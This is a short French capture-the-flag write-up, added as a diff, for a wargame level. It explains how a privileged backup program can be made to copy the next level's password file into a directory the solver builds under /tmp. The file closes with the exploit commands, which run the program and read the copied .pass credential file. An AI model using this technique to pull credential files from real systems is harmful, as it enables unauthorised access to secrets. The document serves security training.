@@ -1,0 +1,13 @@
+Pour cet exercice, rien de complique, il suffit de comprendre ce que fait le
+programme pour lui creer un environnement propice a l'exploit. On veut faire
+lire le fichier /home/users/level09/.pass, et le programme va donc naturelement
+vouloir le mettre dans ./backups/home/users/level09/.pass, on va donc se mettre
+dans /tmp, et creer la hierarchie de dossier suivant: backups/home/users/level09/
+pour qu'il puisse ecrire son fichier tranquilement.
+
+Exploit:
+mkdir /tmp/backups
+mkdir /tmp/backups/home
+mkdir /tmp/backups/home/users
+mkdir /tmp/backups/home/users/level09
+cd /tmp ; ~/level08 /home/users/level09/.pass ; cat /tmp/backups/home/users/level09/.pass
